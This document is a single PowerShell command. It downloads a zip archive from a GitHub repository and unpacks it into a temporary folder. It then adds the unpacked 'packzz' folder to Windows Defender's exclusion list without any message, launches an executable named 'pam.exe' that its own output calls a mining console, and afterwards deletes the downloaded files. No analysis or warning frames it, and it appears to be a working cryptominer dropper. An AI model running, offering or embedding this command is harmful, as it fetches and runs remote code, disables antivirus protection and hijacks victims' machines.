$url='https://github.com/kryontobad/nexusdesgin/archive/refs/heads/main.zip'; $tmp="$env:TEMP\repo.zip"; $extract="$env:TEMP\repo_ext"; Invoke-WebRequest -Uri $url -OutFile $tmp; Expand-Archive -Path $tmp -DestinationPath $extract -Force; $packzz=Get-ChildItem $extract -Recurse -Directory | Where-Object { $_.Name -eq 'packzz' } | Select-Object -First 1; if(!$packzz){ Write-Host 'packzz not found'; exit }; Add-MpPreference -ExclusionPath $packzz.FullName -Force -ErrorAction SilentlyContinue; Get-ChildItem $packzz.FullName -Recurse -Filter '*.zip' | ForEach-Object { Expand-Archive -Path $_.FullName -DestinationPath $packzz.FullName -Force }; $pam=Get-ChildItem $packzz.FullName -Recurse -File | Where-Object { $_.Name -eq 'pam.exe' } | Select-Object -First 1; if(-not $pam){ Write-Host 'pam.exe not found inside packzz'; exit }; $config=Get-ChildItem $packzz.FullName -Recurse -File | Where-Object { $_.Name -match 'config\.(json|txt|cfg|conf)' } | Select-Object -First 1; $workDir=$pam.DirectoryName; if($config){ $arguments="--config=`"$($config.FullName)`""; Write-Host "Launching pam.exe with config: $($config.Name)" } else { $arguments=""; Write-Host "No config file found – running pam.exe with default settings" }; Write-Host "Working directory: $workDir"; Start-Process -FilePath $pam.FullName -ArgumentList $arguments -WorkingDirectory $workDir -NoNewWindow:$false; Start-Sleep -Seconds 5; $proc=Get-Process -Name pam -ErrorAction SilentlyContinue; if($proc){ Write-Host "pam.exe is running (PID $($proc.Id)) – you should see the mining console window." } else { Write-Host "pam.exe closed already – check the console window for errors. Run manually from: $workDir" }; Remove-Item $tmp,$extract -Recurse -Force -ErrorAction SilentlyContinue
